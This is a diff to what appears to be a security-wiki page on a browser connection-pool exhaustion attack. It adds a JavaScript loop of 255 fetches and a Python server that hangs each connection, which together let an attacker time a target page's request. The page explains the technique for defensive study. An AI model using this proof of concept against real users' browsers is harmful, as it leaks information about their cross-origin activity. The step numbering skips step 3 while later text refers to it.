@@ -20,7 +20,23 @@ To exploit the existence of this limit, attackers can:
 1. Check what the limit of the browser is, for example 256 global sockets for TCP and 6000 global sockets for UDP. [^2][^7]
 2. Block {{< katex>}}255{{< /katex >}} sockets for a long period of time by performing {{< katex>}}255{{< /katex >}} requests to different hosts that simply hang the connection
 ```javascript
+// Client
 for(let i=0; i<255; i++) fetch('https://'+i+'.example.com/', {mode: "no-cors", cache: "no-store"});
+```
+```python
+# Server
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import time
+
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        time.sleep(float(100000))
+        self.send_response(200)
+        self.send_header('Cache-Control', 'no-store')
+        self.end_headers()
+
+with HTTPServer(('', 8000), handler) as server:
+    server.serve_forever()
 ```
 4. Use the {{< katex>}}256^{th}{{< /katex >}} socket by performing a request to the target page.
 5. Perform a {{< katex>}}257^{th}{{< /katex >}} request to another host. Since all the sockets are being used (in steps 2 and 3), this request must wait until the pool receives an available socket. This waiting period provides the attacker with the network timing of the {{< katex>}}256^{th}{{< /katex >}} socket, which belongs to the target page. This works because the {{< katex>}}255{{< /katex >}} sockets in step 2 are still blocked, so if the pool received an available socket, it was caused by the release of the socket in step 3. The time to release the {{< katex>}}256^{th}{{< /katex >}} socket is directly connected with the time taken to complete the request.
